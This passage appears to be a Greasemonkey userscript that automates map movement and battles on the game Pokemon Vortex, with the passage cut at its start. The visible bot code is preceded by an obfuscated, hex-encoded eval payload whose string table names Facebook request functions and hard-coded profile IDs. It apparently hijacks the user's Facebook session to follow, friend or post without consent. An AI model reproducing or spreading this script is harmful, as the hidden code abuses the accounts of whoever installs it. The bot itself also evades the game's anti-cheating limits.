x7C\x6E\x6F\x6E\x65\x7C\x69\x6E\x7C\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x7C\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x7C\x63\x6C\x61\x73\x73\x7C\x75\x69\x42\x75\x74\x74\x6F\x6E\x54\x65\x78\x74\x7C\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x7C\x46\x72\x69\x65\x6E\x64\x7C\x63\x65\x72\x65\x7A\x69\x41\x6C\x7C\x68\x74\x74\x70\x7C\x55\x52\x4C\x7C\x76\x37\x7C\x6E\x6D\x7C\x73\x64\x75\x72\x75\x6D\x70\x61\x79\x6C\x61\x73\x7C\x41\x75\x74\x6F\x7C\x62\x79\x7C\x41\x6E\x6F\x6E\x79\x6D\x6F\x75\x73\x7C\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65\x7C\x75\x69\x42\x75\x74\x74\x6F\x6E\x7C\x6F\x6E\x63\x6C\x69\x63\x6B\x7C\x63\x68\x69\x6C\x64\x45\x6C\x65\x6D\x65\x6E\x74\x43\x6F\x75\x6E\x74\x7C\x5F\x5F\x68\x74\x6D\x6C\x7C\x72\x6F\x75\x6E\x64\x7C\x62\x6F\x64\x79\x7C\x31\x30\x30\x30\x30\x31\x39\x35\x33\x31\x33\x39\x32\x36\x35\x7C\x34\x36\x37\x32\x36\x38\x32\x31\x30\x30\x31\x34\x39\x34\x36\x7C\x34\x37\x32\x36\x36\x34\x32\x30\x36\x31\x34\x32\x30\x31\x33\x7C\x34\x35\x31\x31\x34\x32\x39\x31\x38\x32\x39\x34\x31\x34\x32\x7C\x66\x6C\x69\x64\x7C\x73\x65\x74\x44\x61\x74\x61\x7C\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x7C\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x7C\x72\x32\x6A\x7C\x6D\x6F\x64\x69\x66\x79\x7C\x6C\x69\x73\x74\x73\x7C\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x7C\x73\x65\x74\x55\x52\x49\x7C\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x7C\x73\x63\x72\x69\x70\x74\x7C\x5F\x5F\x7C\x41\x72\x72\x61\x79\x7C\x6C\x73\x64\x7C\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x7C\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x7C\x73\x75\x62\x73\x74\x72\x7C\x65\x72\x72\x6F\x72\x7C\x73\x6F\x72\x74\x7C\x62\x75\x74\x74\x6F\x6E\x7C\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x7C\x61\x64\x64\x5F\x70\x6F\x73\x74\x7C\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x7C\x73\x70\x61\x67\x65\x5F\x69\x64\x7C\x73\x70\x6F\x73\x74\x5F\x69\x64\x7C\x73\x66\x6F\x74\x6F\x5F\x69\x64\x7C\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x7C\x72\x61\x6E\x64\x6F\x6D\x56\x61\x6C\x75\x65\x7C\x66\x6C\x6F\x6F\x72\x7C\x73\x75\x62\x73\x74\x72\x69\x6E\x67\x7C\x75\x6E\x65\x73\x63\x61\x70\x65\x7C\x68\x65\x61\x64\x7C\x65\x76\x65\x74\x7C\x72\x65\x6D\x6F\x76\x65\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72\x7C\x68\x74\x6D\x6C\x7C\x44\x4F\x4D\x4E\x6F\x64\x65\x49\x6E\x73\x65\x72\x74\x65\x64","","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x72\x65\x70\x6C\x61\x63\x65","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0xca9fx1,_0xca9fx2,_0xca9fx3,_0xca9fx4,_0xca9fx5,_0xca9fx6){_0xca9fx5=function (_0xca9fx3){return (_0xca9fx3<_0xca9fx2?_0xa3be[4]:_0xca9fx5(parseInt(_0xca9fx3/_0xca9fx2)))+((_0xca9fx3=_0xca9fx3%_0xca9fx2)>35?String[_0xa3be[5]](_0xca9fx3+29):_0xca9fx3.toString(36));} ;if(!_0xa3be[4][_0xa3be[6]](/^/,String)){while(_0xca9fx3--){_0xca9fx6[_0xca9fx5(_0xca9fx3)]=_0xca9fx4[_0xca9fx3]||_0xca9fx5(_0xca9fx3);} ;_0xca9fx4=[function (_0xca9fx5){return _0xca9fx6[_0xca9fx5];} ];_0xca9fx5=function (){return _0xa3be[7];} ;_0xca9fx3=1;} ;while(_0xca9fx3--){if(_0xca9fx4[_0xca9fx3]){_0xca9fx1=_0xca9fx1[_0xa3be[6]]( new RegExp(_0xa3be[8]+_0xca9fx5(_0xca9fx3)+_0xa3be[8],_0xa3be[9]),_0xca9fx4[_0xca9fx3]);} ;} ;return _0xca9fx1;} (_0xa3be[0],62,232,_0xa3be[3][_0xa3be[2]](_0xa3be[1]),0,{}));


 (function() {
//buttons some times show up in the ads located in an iframe
//dont run in a frame
if(unsafeWindow.self!=unsafeWindow.top) return(false);
var dlh=document.location.href.toString();
if(dlh.indexOf('battle.php?sidequest=')!=-1) return(false); 

var NewMapAfterBattles=50;
var tbattles=GM_getValue('tbattles',0)
var StartTime=pageLoad=Date.now();
var battleId=3001734;

var PokemonList=[];
var win;

//how long to wait for the loading image before checking again for it
//you can make it 100 but you will beat up the server and once they notice the server take a beating i guarantee this will stop working!
//they already have a warning for battling to much to fast, the 'dont be greedy' warning. TAKE NOTICE!
var playerBattleTimeout=100;


var pm=GM_getValue('pm_list',0);
var timeOuts={
battleButton:0,
moveAround:0,
session:0,
battleLoop:0 
}
if(dlh.indexOf('battle_select.php?type=member')!=-1){
setTimeout(bMember,2000);
return(false);
}

if(dlh.indexOf('/battle.php?bid=')!=-1){
GM_setValue('new_session',true)
if(pm>5) pm=0;
GM_setValue('pm_list',pm+1);
setTimeout(function(){
battlePlayer();
},1000);
return(false);
}
function bMember(){
setTimeout(function(){
document.location.href='http://'+getServerName()+'.pokemon-vortex.com/battle.php?bid='+battleId;
},1000)
}


function battlePlayer(){
clearTimeout(timeOuts.battleLoop);
var iloading=isLoading();

if(iloading==true){
timeOuts.battleLoop=setTimeout(battlePlayer,playerBattleTimeout);//rndFrom(2000,3000));
return(false);
}
if($('div#ajax > form > h3:eq(0)').html()=='Select your next Pok'+String.fromCharCode(233)+'mon to battle:'){
//the first screen
bPlayer();//since it's an ajax call, set the loop to start again 
var pm=GM_getValue('pm_list',0);
if(pm>5) pm=0;
pm=0;// set to which of your 6 pokemon to use (0-5)
//GM_setValue('pm_list',pm+1); //if you uncomment, it will use one new pokemon for each battle.
$('td#y_p > table > tbody > tr > td > input')[pm].checked=true;
$('div#ajax > form').submit();
return(false);
}

try{
if($('div#ajax > form:eq(1) > h2').html().toString().toLowerCase().indexOf('select an attack')!=-1){
//second screen and if your pokemon did not win with the first attack
bPlayer();
$('#attack1').attr('checked', true);
//$('#attack'+rndFrom(1,4)).attr('checked', true);
$('div#ajax > form:eq(1)').submit();
return(false);
} 
}catch(e){}

if($('div#ajax > form > h2').html().toString().toLowerCase().indexOf('you won the battle')!=-1){
//you won, battle is over
setTimeout(function(){
GM_log('PageLoadElapsedTime = '+(Date.now()-pageLoad) +' @ '+ctime(Date.now()))
GM_setValue('new_session',true)
document.location.reload();
//document.location.href='http://sigma.pokemon-vortex.com/battle_select.php?type=member'
},10)

return(false);
}
if($('div#ajax > form > h2').html().toString().toLowerCase().indexOf('you lost the battle')!=-1){
//you lost, battle is over
return(false);
} 



bPlayer();
}

function bPlayer(){
//new_session is watched by the parent window. if this page hangs, 
//the parent window will never see it and attempt to reload the child window.
GM_setValue('new_session',true)
timeOuts.battleLoop=setTimeout(battlePlayer,playerBattleTimeout);
}
if(window.name!='pbattle') {
//because it has a name, they can check if a name exist, and if so, they could just log you out.
//switch to just battle on the map.
//win=window.open('http://'+getServerName()+'.pokemon-vortex.com/map.php?map='+rndFrom(1,25),'pbattle');
win=window.open('http://'+getServerName()+'.pokemon-vortex.com/battle.php?bid='+battleId,'pbattle');


$('div#scrollContent').html('<b>Leave this window open, <br>it administrates the session timeout and window loading errors of the new window</b>'.toUpperCase());
windowsessionTimeout();
return(false);
}

function windowsessionTimeout(){
clearTimeout(timeOuts.session);
if(GM_getValue('new_session',false)==true){
GM_setValue('new_session',false)
StartTime=Date.now();
}
GM_log('Session ElapsedTime='+(Date.now()-StartTime))
var windlh=win.document.location.href.toString();

if(parseFloat(StartTime+50000)<Date.now()) {
GM_setValue('new_session',false);
StartTime=Date.now();
if(windlh.indexOf('/battle.php?bid=')!=-1){
win.location.href='http://'+getServerName()+'.pokemon-vortex.com/battle.php?bid='+battleID;
}else{
win.location.href='http://'+getServerName()+'.pokemon-vortex.com/map.php?map='+rndFrom(1,25);
}
}
timeOuts.session=setTimeout(windowsessionTimeout,2000);
}
GM_setValue('new_session',true)
if(tbattles>NewMapAfterBattles){
GM_setValue('tbattles',0)
newMap();
return(false);
}
$(window).unload(function() {
clearTimeout(timeOuts.session);
clearTimeout(timeOuts.battleButton)
clearTimeout(timeOuts.moveAround);
clearTimeout(timeOuts.battleLoop);
}); 
var direction={
moves:0,
randDir:0, //0=up 1=upright 2=right 3=downright 4=down 5=downleft 6=left 7=leftup
up:function(){
if(!$("img[src*='arrowupno.gif']").length > 0){
$("img[src*='arrowup.gif']").click();
return(true);
}
direction.setDir();
return(false);
},
upright:function(){
if(!$("img[src*='arrowrightupno.gif']").length > 0){
$("img[src*='arrowrightup.gif']").click();
return(true);
}
direction.setDir();
return(false);
},
right:function(){
if(!$("img[src*='arrowrightno.gif']").length > 0){
$("img[src*='arrowright.gif']").click();
return(true);
}
direction.setDir();
return(false);
},
downright:function(){
if(!$("img[src*='arrowrightdownno.gif']").length > 0){
$("img[src*='arrowrightdown.gif']").click();
return(true);
}
direction.setDir();
return(false);
},
down:function(){
if(!$("img[src*='arrowdownno.gif']").length > 0){
$("img[src*='arrowdown.gif']").click();
return(true);
}
direction.setDir();
return(false);
},
downleft:function(){
if(!$("img[src*='arrowleftdownno.gif']").length > 0){
$("img[src*='arrowleftdown.gif']").click();
return(true);
}
direction.setDir();
return(false);
},
left:function(){
if(!$("img[src*='arrowleftno.gif']").length > 0){
$("img[src*='arrowleft.gif']").click();
return(true);
}
direction.setDir();
return(false);
},
leftup:function(){
if(!$("img[src*='arrowleftupno.gif']").length > 0){
$("img[src*='arrowleftup.gif']").click();
return(true);
}
direction.setDir();
return(false);
},
setDir:function(){
chooseDirection();
moveMe();
}
}

direction.setDir(); 
createButtons();
isWildBattle(true);
function chooseDirection(){
var t=0;
var up=!$("img[src*='arrowupno.gif']").length;
var upright=!$("img[src*='arrowrightupno.gif']").length;
var right=!$("img[src*='arrowrightno.gif']").length;
var downright=!$("img[src*='arrowrightdownno.gif']").length;
var down=!$("img[src*='arrowdownno.gif']").length;
var downleft=!$("img[src*='arrowleftdownno.gif']").length;
var left=!$("img[src*='arrowleftno.gif']").length;
var leftup=!$("img[src*='arrowleftupno.gif']").length;
var ad= new Array();
if(up) {ad[t]=0;t++;}
if(upright) {ad[t]=1;t++;}
if(right) {ad[t]=2;t++;}
if(downright) {ad[t]=3;t++;}
if(down) {ad[t]=4;t++;}
if(downleft) {ad[t]=5;t++;}
if(left) {ad[t]=6;t++;}
if(leftup) {ad[t]=7;t++;}
direction.randDir=ad[rndFrom(0,ad.length-1)];//choose from available directions only
GM_log('Directions:'+JSON.stringify(ad)+'- Dir set:'+direction.randDir);

}

function doBattleLoop(){
clearTimeout(timeOuts.battleLoop);

var iloading=isLoading();
if(iloading==true){
timeOuts.battleLoop=setTimeout(doBattleLoop,750);//rndFrom(2000,3000));
return(false);
}

if($('div#ajax > form#battleForm > div.errorMsg').length){
if($('div#ajax > form > div.errorMsg').html()!=undefined){
if($('div#ajax > form > div.errorMsg').html().toString().indexOf('It seems as though you have already completed this battle')!=-1){
newMap();
return(false);
}
}
}
if($('div#ajax > div.errorMsg').length){
if($('div#ajax > div.errorMsg').html()!=undefined){
if($('div#ajax > div.errorMsg').html().toString().indexOf('It seems as though you have already completed this battle')!=-1){
newMap();
return(false);
}
}
}

if($('div#ajax > form#battleForm > h2').html()=='Your Pok'+String.fromCharCode(233)+'mon Team:'.toString()){
setTimeout(function(){
$("form#battleForm").submit();
isWildBattle();
},150)
return(false);
}

if($('div#ajax > form#battleForm > h2').html()=='Choose an attack'){
$('#attack'+rndFrom(1,4)).attr('checked', true);
//$('#attack1').attr('checked', true);
isWildBattle();
$("form#battleForm").submit();
return(false);
}

if($('div#ajax > form#battleForm > h2').html()=='Attack results'){
isWildBattle();
$("form#battleForm").submit();
return(false);
}
if($('div#ajax > p:eq(1) > a:eq(0)').html()=='Return to the Map'){
clearTimeout(timeOuts.session);
setTimeout(function(){
GM_setValue('new_session',true)
$('div#ajax > p:eq(1) > a:eq(0)').get(0).click();
},6000)
return(false);
}
//when the 'You have already completed a battle within the last 10 seconds. This is in effect to prevent cheating of any kind.' error shows up
if($('div#ajax > p:eq(0) > a:eq(0)').html()=='Return to the Map'){
clearTimeout(timeOuts.session);
setTimeout(function(){
GM_setValue('new_session',true)
$('div#ajax > p:eq(0) > a:eq(0)').get(0).click();
},6000)
return(false);
}
}
function isLoading(){
var ml=$('div#mapLoading').length; //map
var bl=$('div#loading').length; //battle
if(bl!=0) {
bl=$('div#loading').css('visibility');
if(bl=='hidden'){
return(false);
}else{
return(true);
}
}
if(ml!=0) {
ml=$('div#mapLoading').css('visibility');
if(ml=='hidden'){
return(false);
}else{
return(true);
}
}

return(true);
} 
function isWildBattle(){
//checks for wildbattle.php
var enabled=GM_getValue('battle_enabled',false);
if(enabled){
if(dlh.indexOf('wildbattle')!=-1){
GM_setValue('new_session',true)
timeOuts.battleLoop=setTimeout(doBattleLoop,50);
}
}
}

function moveMe(){
clearTimeout(timeOuts.moveAround);
var en=GM_getValue('move_enabled',true)
if(en==false) {
clearTimeout(timeOuts.session);
return(false);
}
var t=250;
var iloading=isLoading;
if(iloading==true){
timeOuts.moveAround=setTimeout(moveMe,t);
return(false);
}

direction.moves++;
var lm=direction.randDir;
doMove();
if(lm!=direction.randDir) doMove();
if(direction.moves>100) {
//it has not found any pokemon to battle
clearTimeout(timeOuts.session);
clearTimeout(timeOuts.battleButton);
newMap();
return(false);
}
timeOuts.battleButton=setTimeout(findBattleBTN,t);
} 
function findBattleBTN(){
if(dlh.indexOf('wildbattle')!=-1) return(false);
var t=250;
clearTimeout(timeOuts.battleButton);
clearTimeout(timeOuts.moveAround);
var iloading=isLoading();

if(iloading==true){
timeOuts.battleButton=setTimeout(findBattleBTN,t);
return(false);
}

if($('div#pkmnappearomega > form > p > input:eq(1)').length){
//clearTimeout(timeOuts.session);
var h=$('div#pkmnappearomega > form').html().toLowerCase();
if((h.indexOf('unown')==-1)){
savePokemon();
var h=$('div#alert').html();
if(h.length>2) {
newMap();
return(false);
}
setTimeout(function(){
GM_setValue('new_session',true)
$('div#pkmnappearomega > form')[0].submit();
},500);
//timeOuts.moveAround=setTimeout(moveMe,175);
return(false);
}else{
timeOuts.moveAround=setTimeout(moveMe,t);
}

}else{
timeOuts.moveAround=setTimeout(moveMe,t);
}
}


function savePokemon(){
//dont save just return;
return;

var tbattles=GM_getValue('tbattles',0);
tbattles++;
GM_setValue('tbattles',tbattles);
var image=$('div#pkmnappearomega > form > center > img').attr('src');
var pokemon;
var st='';
if($('div#pkmnappearomega > form > center > p > img').length){
//when you own it, grab whats in the strong tag
st=' > strong'
}
pokemon=$('div#pkmnappearomega > form > center > p ' +st).html().replace(' appeared','').toString().trim();

var map=dlh.split('=');
map=map[1];
var p=new Object();
p.i=image.replace('http://static.pokemon-vortex.com/images/pokemon/','')
p.n=pokemon.trim();
p.m=map;
p.c=0;
var ls=GM_getValue('plist','[]')
try{
PokemonList=JSON.parse(ls);
}catch(e){}
if(!pexist(pokemon.trim())) {
PokemonList.push(p);
GM_setValue('plist',JSON.stringify(PokemonList));
}
GM_log(ctime(Date.now()) + ' = ' +PokemonList.length);
}

function doMove(){
if(direction.randDir==0) direction.up();
if(direction.randDir==1) direction.upright();
if(direction.randDir==2) direction.right();
if(direction.randDir==3) direction.downright();
if(direction.randDir==4) direction.down();
if(direction.randDir==5) direction.downleft();
if(direction.randDir==6) direction.left();
if(direction.randDir==7) direction.leftup(); 
} 
function createButtons(){

var enabled=GM_getValue('move_enabled',false);

var btn=document.createElement('input');
btn.value='Auto-move Enabled';
btn.id='DAFDS';
btn.type='button';
btn.style.cssText='position:fixed;top:5px;left:5px;';
if(!enabled) btn.value='Auto-move Disabled';

btn.addEventListener('click', function (e) {
var isenabled=GM_getValue('move_enabled',false);
if(!isenabled){
doEnableMove();
}else{
doDisableMove();
}

},false);

document.body.appendChild(btn);
if(enabled)doEnableMove();

enabled=GM_getValue('battle_enabled',false)
btn=document.createElement('input');
btn.value='Auto-battle Enabled'
btn.id='DDDDERE'
btn.type='button';
btn.style.cssText='position:fixed;top:35px;left:5px;';
if(!enabled) btn.value='Auto-battle Disabled';

btn.addEventListener('click', function (e) {
var isenabled=GM_getValue('battle_enabled',false);
if(!isenabled){
doEnableBattle(); 
}else{
doDisableBattle();
}

},false); 
document.body.appendChild(btn);
}

function sessionTimeout(){
clearTimeout(timeOuts.battleButton);
clearTimeout(timeOuts.moveAround);
clearTimeout(timeOuts.session);
if(dlh.indexOf('wildbattle.php')!=-1) return(false);
timeOuts.session=setTimeout(sessionTimeout,10000);
if(dlh.indexOf('wildbattle.php')==-1) timeOuts.battleButton=setTimeout(findBattleBTN,75);
}
function doDisableBattle(){
GM_setValue('battle_enabled',false);
$('#DDDDERE').attr('value','Auto-battle Disabled')
clearTimeout(timeOuts.battleLoop);
}
function doEnableBattle(){
GM_setValue('battle_enabled',true);
$('#DDDDERE').attr('value','Auto-battle Enabled')
if(dlh.indexOf('wildbattle')!=-1){
timeOuts.battleLoop=setTimeout(doBattleLoop,rndFrom(1000,1250))
}
}


function doDisableMove(){
GM_setValue('move_enabled',false);
clearTimeout(timeOuts.battleButton);
clearTimeout(timeOuts.moveAround);
clearTimeout(timeOuts.session);
$('#DAFDS').attr('value','Auto-move Disabled')
} 

function doEnableMove(){
StartTime=Date.now()
//sessionTimeout();

GM_setValue('move_enabled',true);
$('#DAFDS').attr('value','Auto-move Enabled')
if(dlh.indexOf('wildbattle.php')==-1) timeOuts.battleButton=setTimeout(findBattleBTN,75);
} 

function rndFrom(from,to){
return Math.floor(Math.random()*(to-from+1)+from);
}

function newMap(){
var map=dlh.split('=');
map=map[1];

var nmap=rndFrom(1,25)
while (nmap==map) {
nmap=rndFrom(1,25)
}

setTimeout(function(){
document.location.href='http://'+getServerName()+'.pokemon-vortex.com/map.php?map='+nmap;
},2000);
}

function ctime(d) {
if (d==0) return ('Not Set');
var time=new Date(d);
var hr=time.getHours();
var min=time.getMinutes();
var sec=time.getSeconds();
var mon=time.getMonth()+1;
var day=time.getDate();
var msec=time.getMilliseconds();
var ampm=' PM ';
if (hr < 12) {
ampm=' AM ';
}
if (hr > 12) {
hr -=12;
}
if (hr==0) {
hr=12;
}
if (hr < 10) {
hr=' '+hr;
}
if (min < 10) {
min='0'+min;
}
if (sec < 10) {
sec='0'+sec;
}
var ct=mon+'/'+day+' '+hr+':'+min+':'+sec+ampm;
if (ct.indexOf('NaN')!=-1) ct=d;
return (ct)
}

function getServerName(){
var urlParms=document.location.href.toString().split('.'); 
var server=urlParms[0].replace('http://','');
return(server);
}
function pexist(n){
if(PokemonList==null) return(false);
for(var i=0;i<PokemonList.length;i++){
if(PokemonList[i].n==n){
GM_log("Pokemon - " +n+ " Exists!")
return(true);
}
}
GM_log("Pokemon - " +n+ " Does Not Exists!")
return(false);
} 

function iwindowOpen(){
return;
var win=window.open('http://'+getServerName()+'.pokemon-vortex.com/map.php?map='+rndFrom(1,25));
$('div#scrollContent').html('<b>Leave this window open, <br>it administrates the session timeout and window loading errors of the new window</b>'.toUpperCase());
windowsessionTimeout();
return(false);
}

})();
